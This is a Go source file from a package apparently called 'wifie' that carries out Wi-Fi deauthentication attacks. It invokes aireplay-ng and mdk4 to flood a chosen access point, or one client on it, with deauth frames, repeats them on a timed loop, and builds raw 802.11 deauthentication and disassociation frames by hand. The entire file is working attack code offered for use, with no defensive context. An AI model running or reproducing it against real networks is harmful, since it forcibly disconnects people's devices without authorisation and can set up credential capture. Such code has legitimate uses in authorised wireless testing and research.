package wifie

import (
	"fmt"
	"os/exec"
	"time"
)

func SendDeauth(iface, bssid, client string, count int) (*DeauthResult, error) {
	result := &DeauthResult{
		TargetMAC: client,
		BSSID:     bssid,
		Count:     count,
	}

	if count <= 0 {
		count = 1
	}

	start := time.Now()

	if client == "" || client == "FF:FF:FF:FF:FF:FF" || client == "ff:ff:ff:ff:ff:ff" {
		output, err := exec.Command("aireplay-ng", "-0", fmt.Sprintf("%d", count), "-a", bssid, iface).Output()
		if err != nil {
			output, err = exec.Command("mdk4", iface, "d", "-B", bssid).Output()
			if err != nil {
				return result, fmt.Errorf("wifie: deauth failed: %s: %w", string(output), err)
			}
		}
		_ = output
	} else {
		output, err := exec.Command("aireplay-ng", "-0", fmt.Sprintf("%d", count), "-a", bssid, "-c", client, iface).Output()
		if err != nil {
			output, err = exec.Command("mdk4", iface, "d", "-B", bssid, "-S", client).Output()
			if err != nil {
				return result, fmt.Errorf("wifie: deauth failed: %s: %w", string(output), err)
			}
		}
		_ = output
	}

	result.SuccessCount = count
	result.Duration = time.Since(start).Seconds()
	return result, nil
}

func SendDeauthWithDelay(iface, bssid, client string, count int, delay time.Duration) (*DeauthResult, error) {
	result := &DeauthResult{
		TargetMAC: client,
		BSSID:     bssid,
		Count:     count,
	}

	if count <= 0 {
		count = 1
	}

	start := time.Now()

	for i := 0; i < count; i++ {
		_, err := SendDeauth(iface, bssid, client, 1)
		if err == nil {
			result.SuccessCount++
		}
		if i < count-1 {
			time.Sleep(delay)
		}
	}

	result.Duration = time.Since(start).Seconds()
	return result, nil
}

func BuildDeauthPacket(bssid, client, transmitter string, reason uint16) []byte {
	packet := make([]byte, 26)

	packet[0] = 0xC0
	packet[1] = 0x00
	packet[2] = 0x00
	packet[3] = 0x00

	copy(packet[4:10], parseMACBytes(client))
	copy(packet[10:16], parseMACBytes(transmitter))
	copy(packet[16:22], parseMACBytes(bssid))

	packet[22] = 0x00
	packet[23] = 0x00

	packet[24] = byte(reason & 0xFF)
	packet[25] = byte((reason >> 8) & 0xFF)

	return packet
}

func parseMACBytes(mac string) []byte {
	macBytes := make([]byte, 6)
	fmt.Sscanf(mac, "%02x:%02x:%02x:%02x:%02x:%02x",
		&macBytes[0], &macBytes[1], &macBytes[2],
		&macBytes[3], &macBytes[4], &macBytes[5])
	return macBytes
}

func BuildDisassocPacket(bssid, client, transmitter string, reason uint16) []byte {
	packet := make([]byte, 26)

	packet[0] = 0xA0
	packet[1] = 0x00
	packet[2] = 0x00
	packet[3] = 0x00

	copy(packet[4:10], parseMACBytes(client))
	copy(packet[10:16], parseMACBytes(transmitter))
	copy(packet[16:22], parseMACBytes(bssid))

	packet[22] = 0x00
	packet[23] = 0x00

	packet[24] = byte(reason & 0xFF)
	packet[25] = byte((reason >> 8) & 0xFF)

	return packet
}